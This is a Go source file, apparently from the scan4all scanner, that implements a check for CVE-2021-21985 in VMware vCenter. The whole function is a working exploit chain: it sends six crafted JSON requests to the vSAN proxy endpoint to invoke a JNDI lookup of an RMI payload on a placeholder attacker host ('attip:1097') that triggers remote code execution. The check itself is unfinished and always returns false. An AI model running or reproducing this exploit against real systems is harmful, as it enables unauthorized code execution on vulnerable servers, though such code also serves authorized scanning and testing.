package vCenter

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io"
	"net/http"
	"net/url"
)

/*
https://github.com/welk1n/JNDI-Injection-Bypass/
*/
func Check_CVE_2021_21985(szUrl string) bool {
	szPayload := "rmi://attip:1097/ExecByEL"
	aP := []string{
		`{"methodInput":[null]}`,
		`{"methodInput":["javax.naming.InitialContext.doLookup"]}`,
		`{"methodInput":["doLookup"]}`,
		fmt.Sprintf(`methodInput":[["%s"]]}`, szPayload),
		`{"methodInput":[]}`,
		`{"methodInput":[]}`,
	}
	if oU, err := url.Parse(szUrl); nil == err {
		s1 := oU.Scheme + "://" + oU.Hostname() + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
		uris := []string{"/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"}
		headers := map[string]string{"Content-Type": "application/json"}
		for i, x := range uris {
			util.SendData2Url(s1+x, aP[i], &headers, func(resp *http.Response, err error, szU string) {
				if nil != resp {
					io.Copy(io.Discard, resp.Body)
				}
			})
		}
		// Delay a few seconds to check the RMI callback; if the target cannot
		// reach the internet, try SSRF instead

	}
	return false
}
